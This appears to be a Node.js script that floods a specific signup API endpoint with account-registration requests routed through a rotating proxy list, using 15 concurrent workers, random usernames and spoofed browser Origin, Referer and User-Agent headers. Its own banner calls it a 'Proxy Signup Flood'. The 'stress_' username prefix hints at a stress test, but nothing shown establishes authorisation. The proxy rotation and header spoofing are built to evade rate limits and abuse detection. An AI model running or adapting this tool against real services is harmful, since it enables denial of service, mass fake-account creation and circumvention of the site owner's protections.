const fs = require('fs');
const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent').HttpsProxyAgent;

const URL = 'https://api.aryankaushik.space/api/auth/signup';
const PROXY_FILE = 'proxy.txt';
const REQUESTS_PER_PROXY = 20;
const CONCURRENCY = 15;           // Number of proxies running at the same time
const REQUEST_TIMEOUT = 8000;     // 8 seconds timeout per request

let proxies = [];
let proxyIndex = 0;

// Load proxies
try {
    proxies = fs.readFileSync(PROXY_FILE, 'utf8')
                .split('\n')
                .map(p => p.trim())
                .filter(p => p && !p.startsWith('#'));
    console.log(`Loaded ${proxies.length} proxies from ${PROXY_FILE}`);
} catch (e) {
    console.error("❌ proxy.txt not found!");
    process.exit(1);
}

function randomString(len = 10) {
    return Math.random().toString(36).substring(2, len + 2);
}

function getNextProxy() {
    if (proxies.length === 0) return null;
    const proxyStr = proxies[proxyIndex % proxies.length];
    proxyIndex++;
    return proxyStr;
}

async function processProxy() {
    const proxyStr = getNextProxy();
    if (!proxyStr) return;

    const [host, port] = proxyStr.split(':');
    const proxyConfig = { host, port: parseInt(port), protocol: 'http' };
    const agent = new HttpsProxyAgent(proxyConfig);

    console.log(`🔌 Testing proxy → ${proxyStr}`);

    let successCount = 0;

    for (let i = 1; i <= REQUESTS_PER_PROXY; i++) {
        const rand = randomString(8);
        const username = `stress_${rand}`;
        const email = `astride-shy-float@duck.com`;
        const password = `Pass${rand}123!`;

        const payload = { username, email, password };

        try {
            const res = await axios.post(URL, payload, {
                httpsAgent: agent,
                timeout: REQUEST_TIMEOUT,           // ← Important timeout
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Origin': 'https://aeroweb.aryankaushik.space',
                    'Referer': 'https://aeroweb.aryankaushik.space/'
                }
            });

            console.log(`[${proxyStr}] ${i}/${REQUESTS_PER_PROXY} | ${email} → ${res.status} | ${JSON.stringify(res.data)}`);
            successCount++;

        } catch (err) {
            let status = 'ERROR';
            let body = err.message;

            if (err.response) {
                status = err.response.status;
                body = JSON.stringify(err.response.data);
            } else if (err.code === 'ECONNREFUSED') {
                status = 'CONN_REFUSED';
            } else if (err.code === 'ECONNRESET') {
                status = 'CONN_RESET';
            } else if (err.code === 'ETIMEDOUT') {
                status = 'TIMEOUT';
            }

            console.log(`[${proxyStr}] ${i}/${REQUESTS_PER_PROXY} | ${email} → ${status} | ${body}`);
        }
    }

    console.log(`✅ Finished ${REQUESTS_PER_PROXY} requests on ${proxyStr} | Successful: ${successCount}\n`);
}

// ====================== START ======================
console.log("=== Multi-Threaded Proxy Signup Flood with Timeout ===\n");

const workers = [];
for (let i = 0; i < CONCURRENCY; i++) {
    workers.push(processProxy());
}

Promise.all(workers).then(() => {
    console.log("🎯 All proxies processed. Script finished.");
});
